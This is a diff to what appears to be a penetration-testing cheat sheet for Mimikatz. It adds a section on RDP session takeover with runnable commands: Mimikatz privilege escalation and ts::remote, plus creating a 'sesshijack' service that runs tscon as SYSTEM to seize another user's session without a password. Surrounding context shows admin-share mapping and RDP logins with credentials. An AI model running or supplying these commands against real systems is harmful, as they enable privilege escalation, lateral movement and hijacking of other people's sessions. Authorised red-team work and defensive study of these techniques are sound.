@@ -70,6 +70,23 @@ net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
+## Mimikatz RDP session takeover
+
+Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
+
+```powershell
+privilege::debug 
+token::elevate 
+ts::remote /id:2 
+```
+
+```powershell
+# get the Session ID you want to hijack
+query user
+create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+net start sesshijack
+```
+
 ## Mimikatz commands
 
 | Command |Definition|
